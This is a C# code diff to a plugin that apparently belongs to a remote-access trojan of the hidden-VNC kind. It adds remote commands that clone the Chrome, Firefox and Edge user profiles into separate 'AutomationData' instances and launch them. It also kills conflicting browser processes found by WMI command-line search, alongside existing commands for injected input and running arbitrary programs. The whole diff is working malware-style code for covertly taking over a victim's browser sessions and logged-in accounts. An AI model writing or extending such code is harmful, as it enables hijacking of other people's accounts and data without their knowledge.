@@ -11,6 +11,8 @@ using System.Threading;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+using System.Management;
+using System.Diagnostics;
 
 namespace Plugin
 {
@@ -19,6 +21,13 @@ namespace Plugin
         Node ImageNode;
         bool playing = false;
         int quality = 100;
+        bool do_browser_clone = false;
+        bool cloning_chrome = false;
+        bool cloning_firefox = false;
+        bool cloning_edge = false;
+        bool has_clonned_chrome = false;
+        bool has_clonned_firefox=false;
+        bool has_clonned_edge = false;
         Imaging_handler ImageHandler;
         input_handler InputHandler;
         Process_Handler ProcessHandler;
@@ -65,13 +74,59 @@ namespace Plugin
                         IntPtr lParam = (IntPtr)node.sock.BytesToInt(await node.ReceiveAsync());
                         new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
                     }
-                    else if (data[0] == 4) 
+                    else if (data[0] == 4)
                     {
                         ProcessHandler.StartExplorer();
                     }
                     else if (data[0] == 5)
                     {
                         ProcessHandler.CreateProc(Encoding.UTF8.GetString(await node.ReceiveAsync()));
+                    }
+                    else if (data[0] == 6)
+                    {
+                        do_browser_clone = true;
+                    }
+                    else if (data[0] == 7)
+                    {
+                        do_browser_clone = false;
+                    }
+                    else if (data[0] == 8)
+                    { //start chrome
+                        if (do_browser_clone && !has_clonned_chrome)
+                        {
+                            has_clonned_chrome = true;
+                            HandleCloneChrome();
+                        }
+                        else 
+                        {
+                            ProcessHandler.StartChrome();
+                        }
+                    }
+                    else if (data[0] == 9)
+                    { //start firefox
+                        if (do_browser_clone && !has_clonned_firefox)
+                        {
+                            has_clonned_firefox = true;
+                            HandleCloneFirefox();
+
+                        }
+                        else
+                        {
+                            ProcessHandler.StartFirefox();
+                        }
+                    }
+                    else if (data[0] == 10)
+                    { //start edge
+                        if (do_browser_clone && !has_clonned_edge)
+                        {
+                            has_clonned_edge = true;
+                            HandleCloneEdge();
+
+                        }
+                        else
+                        {
+                            ProcessHandler.StartEdge();
+                        }
                     }
                 }
             }
@@ -85,6 +140,111 @@ namespace Plugin
             InputHandler?.Dispose();
             GC.Collect();
 
+        }
+
+        private async Task<int> GetProcessViaCommandLine(string processName, string searchString) {
+            return await Task.Run(() =>
+            {
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT * FROM Win32_Process WHERE Name = '{processName}'");
+
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    string commandLine = obj["CommandLine"]?.ToString();
+
+                    if (commandLine != null && commandLine.Contains(searchString))
+                    {
+                        return Convert.ToInt32(obj["ProcessId"]);
+                    }
+                }
+
+                return -1;
+            });
+        }
+
+
+        private async Task HandleCloneChrome() 
+        {
+            if (!cloning_chrome) 
+            {
+                cloning_chrome = true;
+                try
+                {
+                    await ProcessHandler.CloneChrome();
+                }
+                catch 
+                {
+                    int pid = await GetProcessViaCommandLine("chrome.exe", "ChromeAutomationData");
+                    if (pid != -1) 
+                    {
+                        Process p = Process.GetProcessById(pid);
+                        try
+                        {
+                            p.Kill();
+                            await ProcessHandler.CloneChrome();
+                        }
+                        catch { }
+                        p.Dispose();
+                    }
+                }
+                ProcessHandler.StartChrome();
+                cloning_chrome = false;
+            }
+        }
+        private async Task HandleCloneFirefox()
+        {
+            if (!cloning_firefox) 
+            {
+                cloning_firefox = true;
+                try
+                {
+                    await ProcessHandler.CloneFirefox();
+                }
+                catch
+                {
+                    int pid = await GetProcessViaCommandLine("firefox.exe", "FirefoxAutomationData");
+                    if (pid != -1)
+                    {
+                        Process p = Process.GetProcessById(pid);
+                        try
+                        {
+                            p.Kill();
+                            await ProcessHandler.CloneFirefox();
+                        }
+                        catch { }
+                        p.Dispose();
+                    }
+                }
+                ProcessHandler.StartFirefox();
+                cloning_firefox = false;
+            }
+        }
+        private async Task HandleCloneEdge()
+        {
+            if (!cloning_edge) 
+            {
+                cloning_edge = true;
+                try
+                {
+                    await ProcessHandler.CloneEdge();
+                }
+                catch
+                {
+                    int pid = await GetProcessViaCommandLine("msedge.exe", "EdgeAutomationData");
+                    if (pid != -1)
+                    {
+                        Process p = Process.GetProcessById(pid);
+                        try
+                        {
+                            p.Kill();
+                            await ProcessHandler.CloneEdge();
+                        }
+                        catch { }
+                        p.Dispose();
+                    }
+                }
+                ProcessHandler.StartEdge();
+                cloning_edge = false;
+            }
         }
         public async Task ScreenShotThread()
         {
